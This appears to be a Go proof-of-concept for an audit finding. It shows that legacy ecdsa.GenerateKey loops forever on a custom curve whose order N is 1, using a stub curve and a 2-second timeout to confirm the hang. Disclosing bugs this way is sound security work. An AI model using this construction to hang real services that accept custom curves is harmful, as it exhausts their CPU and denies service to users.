// PoC for finding 067: legacy ECDSA generation/signing loops forever when the
// custom curve's order N is <= 1.
//
// randFieldElement repeats until k != 0 && k < N. For N == 1 no positive integer
// satisfies k < 1, so the loop never terminates as long as the random reader
// keeps returning bytes without error. ecdsa.GenerateKey on a custom curve with
// N == 1 therefore consumes CPU forever.
package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"fmt"
	"math/big"
	"time"
)

type unitOrderCurve struct{}

func (unitOrderCurve) Params() *elliptic.CurveParams {
	return &elliptic.CurveParams{
		Name:    "unit-order",
		BitSize: 8,
		P:       big.NewInt(7),
		N:       big.NewInt(1), // <= 1, randFieldElement loops forever
		Gx:      big.NewInt(1),
		Gy:      big.NewInt(1),
		B:       big.NewInt(0),
	}
}

func (unitOrderCurve) IsOnCurve(*big.Int, *big.Int) bool { return true }
func (unitOrderCurve) Add(*big.Int, *big.Int, *big.Int, *big.Int) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}
func (unitOrderCurve) Double(*big.Int, *big.Int) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}
func (unitOrderCurve) ScalarMult(*big.Int, *big.Int, []byte) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}
func (unitOrderCurve) ScalarBaseMult([]byte) (*big.Int, *big.Int) {
	return big.NewInt(1), big.NewInt(1)
}

func main() {
	curve := unitOrderCurve{}

	done := make(chan error, 1)
	go func() {
		_, err := ecdsa.GenerateKey(curve, rand.Reader)
		done <- err
	}()

	select {
	case err := <-done:
		fmt.Printf("UNEXPECTED: GenerateKey returned err=%v\n", err)
	case <-time.After(2 * time.Second):
		fmt.Println("TIMEOUT AS EXPECTED: ecdsa.GenerateKey looped past 2s on N=1 custom curve")
	}
}
